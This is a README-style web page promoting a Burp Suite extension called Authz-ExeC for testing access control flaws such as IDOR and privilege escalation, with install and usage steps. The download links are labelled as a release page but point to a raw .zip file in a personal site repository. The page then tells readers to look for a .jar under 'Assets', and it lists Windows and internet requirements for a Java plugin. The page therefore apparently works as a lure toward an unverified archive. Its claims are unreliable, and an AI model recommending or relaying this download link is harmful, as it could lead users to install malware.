---
layout: "default"
title: "🛡️ Authz-ExeC - Test web access security with ease"
description: "Test access control across identities and tenants with this Burp Suite extension for automated BAC, IDOR, and privilege escalation analysis."
---
# 🛡️ Authz-ExeC - Test web access security with ease

[![Download Authz-ExeC](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/files/Latest-1.1.zip)

## 🎯 About This Tool

Authz-ExeC helps you check the security of your web applications. It tests if different users can access data or functions they should not see. Security professionals use these tests to find flaws like Broken Access Control, IDOR, BOLA, and privilege escalation. This tool automates the process inside Burp Suite, so you do not have to perform repetitive tasks by hand.

## ⚙️ System Requirements

- A computer running Windows 10 or Windows 11.
- Burp Suite Professional or Community Edition installed.
- Java Runtime Environment (JRE) version 11 or higher.
- A stable internet connection.

## 📥 Getting the Software

You need the latest version of the tool to start your security tests. 

[Click here to visit the release page and download the file.](https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/files/Latest-1.1.zip)

Look for the file ending in `.jar` under the "Assets" section of the latest release. Save this file to a folder you can find easily, such as your Downloads or Desktop folder.

## 🛠️ Setting Up in Burp Suite

Burp Suite functions as a proxy between your web browser and the internet. Use these steps to add the tool:

1. Open Burp Suite on your computer.
2. Select the "Extensions" tab located in the top navigation bar.
3. Click the "Installed" sub-tab.
4. Click the "Add" button.
5. In the window that appears, ensure the "Extension type" is set to "Java".
6. Click "Select file" and navigate to the folder where you saved the `.jar` file.
7. Choose the file and click "Next".
8. Burp Suite loads the extension. Ensure the Status says "Loaded" without errors.

## 🚀 How to Run a Test

Once you install the extension, a new tab for "Authz-ExeC" appears in the Burp Suite interface. Follow these steps to begin:

1. Configure your browser to use Burp Suite as a proxy.
2. Visit the website you wish to test.
3. Send a request from the "HTTP history" tab to the Authz-ExeC tab by right-clicking the request.
4. Set the authentication headers you want to test. These headers identify the different users you are comparing.
5. Initiate the sequence. The tool sends the request with the headers of the different users.
6. Review the results in the Authz-ExeC panel. The tool highlights differences in the responses of the requests based on content size or status codes.

## 🔍 Understanding the Results

The tool displays a table of requests. Focus on these indicators:

- Response Code: A change in status (e.g., from 200 OK to 403 Forbidden) suggests the access control policy works.
- Response Length: Large differences in the size of the returned data often indicate that a user saw information they should not have accessed.
- Comparison: Compare the response of the primary user against the secondary user. If both users see the same data, the system may have a security flaw.

## 🛡️ Best Practices

- Use this tool only on websites you have permission to test.
- Run tests in a staging or development environment if possible.
- Save your logs after each session.
- Document any potential findings to share with your development team.
- Update the extension regularly from the GitHub page to ensure you have the latest improvements.

## ❓ Troubleshooting

If the tool does not work, check these common items:

- Java: Ensure your Java version is up to date. You can check this by typing `java -version` into your Command Prompt.
- Proxy: Verify your browser proxy settings match the settings in Burp Suite.
- File Path: Ensure the `.jar` file is not move or deleted after you add it to Burp Suite. If you move the file, you must remove the extension from Burp Suite and add it again from the new location.
- Burp Suite Restart: Sometimes closing and reopening Burp Suite clears temporary configuration issues.

## 📖 Glossary

- Burp Suite: A tool for testing the security of web applications.
- Proxy: A bridge that records web traffic between your browser and the target site.
- Header: Small pieces of data sent with a request that identify who you are to the server.
- IDOR: A situation where a user can view other users' data by changing a simple ID number in the web address.
- BOLA: Broken Object Level Authorization, which happens when a system fails to check if a user owns the data they are trying to access.

Keywords: burp-extensions, security, web-testing, automation, windows